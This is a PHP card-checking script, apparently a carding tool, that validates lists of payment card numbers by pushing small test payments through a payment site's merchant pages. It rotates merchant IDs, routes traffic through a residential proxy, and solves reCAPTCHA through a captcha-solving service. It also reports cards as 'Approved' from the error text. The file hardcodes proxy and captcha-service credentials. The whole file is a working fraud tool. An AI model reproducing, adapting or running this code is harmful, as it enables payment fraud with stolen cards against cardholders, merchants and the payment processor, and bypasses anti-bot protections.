<?php
error_reporting(0);
ignore_user_abort();

$time = time();

function getstr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function multiexplode($delimiters, $string){
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$dirCcookies = __DIR__.'/cookies/'.uniqid('cookie_').'.txt';

if (!is_dir(__DIR__.'/cookies/')){
    mkdir(__DIR__.'/cookies/' ,0777 , true);
}

foreach (glob(__DIR__."/cookies/*.txt") as $file) {
    if (strpos($file, 'cookie_') !== false){
        unlink($file);
    }
}

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
    die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span>  <br>');
}

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];
$mesFormatado = (strlen($mes) === 2 && $mes[0] === "0") ? $mes[1] : $mes;
$anocurto = substr($ano, -2);

$randodados = uniqid();
$randotelefone = rand(11111111,99999999);
$passaportegen = rand(11111,99999);

function GerarLetrasRandom($tamanho) {
    $letras = '';
    for ($i = 0; $i < $tamanho; $i++) {
        $letras .= chr(rand(97, 122));
    }
    return $letras;
}

$nomespah = GerarLetrasRandom(8);

$businessId = [
    2, 35, 126, 141, 177, 207, 264, 368, 441, 551, 584, 895, 915, 924, 973, 1154, 1372, 1401, 1431, 
    1605, 1695, 1745, 1762, 1841, 2156, 2158, 2450, 2541, 2755, 2839, 2985, 3195, 3262, 3606, 3617, 
    3744, 3843, 3969, 3982, 4172, 4285, 4340, 4341, 4831, 4908, 4958, 5255, 5441, 5490, 5683, 5753, 
    5909, 6529, 6623, 6712, 6752, 6832, 6871, 6916, 6964, 7485, 7749, 7839, 7844, 7952, 8009, 8012, 
    8078, 8197, 8303, 8357, 8364, 8367, 8402, 8493, 8631, 8674, 8787, 8804, 8851, 8869, 8884, 8887, 
    8890, 8899, 8911, 8931, 9002, 9059, 9196, 9199, 9217, 9241, 9268, 9279, 9286, 9327, 9348, 9373, 
    9522, 9592, 9599, 9641, 9685, 9732, 9821, 9869, 9881, 9984, 9995, 10034, 10084, 10091, 10116, 
    10124, 10169, 10172, 10184, 10233, 10292, 10379, 10487, 10682, 10874, 10876, 10903, 10950, 
    11038, 11164, 11202, 11322, 11456, 11530, 11627
];

$businessId = $businessId[array_rand($businessId)];

function getPaymentToken($businessId, $dirCcookies) {
    $maxAttempts = 10;
    $attempt = 1;
    
    while ($attempt <= $maxAttempts) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.payzer.com/Payment/ExternalMake/businessId/'.$businessId.'');
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
        $headers = array();
        $headers[] = 'Host: www.payzer.com';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
        curl_setopt($ch, CURLOPT_COOKIEJAR, $dirCcookies);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $dirCcookies);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_PROXY, 'pr.oxylabs.io:7777');
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'customer-pladix_3fjnv-cc-US:PladixFusion18+');
        $getCookiesPage = curl_exec($ch);
        
        preg_match('/location:\s(.*?)\s/i', $getCookiesPage, $matches);
        
        if (!empty($matches[1])) {
            preg_match('/PM-[a-f0-9]+/', $matches[1], $pmMatch);
            if (!empty($pmMatch[0])) {
                return $pmMatch[0];
            }
        }
        
        $attempt++;
        if ($attempt <= $maxAttempts) {
            sleep(1);
        }
    }
    
    die("Erro ao obter links após $maxAttempts tentativas.");
}

$pmtokenpayment = getPaymentToken($businessId, $dirCcookies);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.payzer.com/Payment/ExternalMake/nt/'.$pmtokenpayment.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.payzer.com';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_COOKIEJAR, $dirCcookies);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dirCcookies);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_PROXY, 'pr.oxylabs.io:7777');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'customer-pladix_3fjnv-cc-US:PladixFusion18+');
$externalMakePayments = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api-v2.nextcaptcha.com/getToken');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{
    "clientKey":"next_33de89347f701dabdda4ad262652b176fb",
    "task": {
        "type": "RecaptchaV2TaskProxyless",
        "websiteURL": "https://www.payzer.com/Payment/ExternalMake/nt/'.$pmtokenpayment.'",
        "websiteKey": "6LdRqCATAAAAAEtlufJFRFSgqjZeCRCKW978YHB5"
    }
}');
$next = curl_exec($ch);
$parts = explode("|", $next, 2);
$tokencap = $parts[1] ?? '';

$invoice = rand(1111,9999);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.payzer.com/Payment/ExternalMake/nt/'.$pmtokenpayment.'');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'nt='.$pmtokenpayment.'&businessId='.$businessId.'&businessCustomerId=&faid=&FirstName=casa&LastName=casa&Email=asgsagsga%40gmail.com&mobilePhone=&Amount=%24+5.00&InvoiceNumber='.$invoice.'&Memo=&PaymentMethod=card&CardNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear=20'.$anocurto.'&Cvv='.$cvv.'&BillingZip=10080&AchAccountHolderType=&AchAccountType=&AchNameOnAccount=&achSameName=N&RoutingNumber=&AccountNumber=&VerifyAccountNumber=&g-recaptcha-response='.$tokencap.'&next=next');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.payzer.com';
$headers[] = 'Origin: https://www.payzer.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
$headers[] = 'Referer: https://www.payzer.com/Payment/ExternalMake/nt/'.$pmtokenpayment.'';
curl_setopt($ch, CURLOPT_COOKIEJAR, $dirCcookies);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dirCcookies);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_PROXY, 'pr.oxylabs.io:7777');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'customer-pladix_3fjnv-cc-US:PladixFusion18+');
$sendPaymentPost = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.payzer.com/Payment/ExternalConfirmPayment/nt/'.$pmtokenpayment.'');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.payzer.com';
$headers[] = 'Referer: https://www.payzer.com/Payment/ExternalMake/nt/'.$pmtokenpayment.'';
curl_setopt($ch, CURLOPT_COOKIEJAR, $dirCcookies);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dirCcookies);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_PROXY, 'pr.oxylabs.io:7777');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'customer-pladix_3fjnv-cc-US:PladixFusion18+');
$getExternalConfirm = curl_exec($ch);

function confirmPayment($pmtokenpayment, $dirCcookies) {
    $maxAttempts = 10;
    $attempt = 1;
    
    while ($attempt <= $maxAttempts) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.payzer.com/Payment/ExternalConfirmPayment/nt/'.$pmtokenpayment.'');
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="CardTerms"

N
------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="CardTerms"

Y
------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="name"

casa casa
------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="expectedName"

casa casa
------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="expectedSocialLast4"


------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="MAX_FILE_SIZE"

104857600
------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="completionDocument"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryHyOeL2mSTm5L4n36--');
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
        $headers = array();
        $headers[] = 'Host: www.payzer.com';
        $headers[] = 'Origin: https://www.payzer.com';
        $headers[] = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHyOeL2mSTm5L4n36';
        $headers[] = 'Upgrade-Insecure-Requests: 1';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
        $headers[] = 'Referer: https://www.payzer.com/Payment/ExternalConfirmPayment/nt/'.$pmtokenpayment.'';
        curl_setopt($ch, CURLOPT_COOKIEJAR, $dirCcookies);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $dirCcookies);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_PROXY, 'pr.oxylabs.io:7777');
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'customer-pladix_3fjnv-cc-US:PladixFusion18+');
        $resp = curl_exec($ch);
        
        // Verifica se a resposta é válida e não contém timeout
        if ($resp !== null && $resp !== false && strpos($resp, '/timeout/y') === false) {
            return $resp;
        }
        
        $attempt++;
        if ($attempt <= $maxAttempts) {
            sleep(1);
        }
    }
    
    if (strpos($resp, '/timeout/y') !== false) {
        global $lista, $infobin, $businessId, $time;

        die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Timeout Gateway após 10 tentativas - (#'.$businessId.') </span> ➔  TIempo de respuesta: (' . (time() - $time) . 's)  <br>');
        
    }
    
    die("Erro ao obter resposta após 10 tentativas.");
}

$resp = confirmPayment($pmtokenpayment, $dirCcookies);
$returnmessage = getstr($resp, 'Your credit card payment was unsuccessful for the following reason: ','</div>' , 1);

if(strpos($resp, 'CVV mismatch')) {

    die('<span class="text-success">Approved</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-success"> Tarjeta vinculada con exito. - (#'.$businessId.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's)  <br>');

} elseif(strpos($resp, 'Your credit card payment was unsuccessful for the following reason')) {

    die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> '.$returnmessage.' - (#'.$businessId.') </span> ➔  TIempo de respuesta: (' . (time() - $time) . 's)  <br>');

} else {

    die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> '.$resp.' </span> ➔  TIempo de respuesta: (' . (time() - $time) . 's)  <br>');

}

?>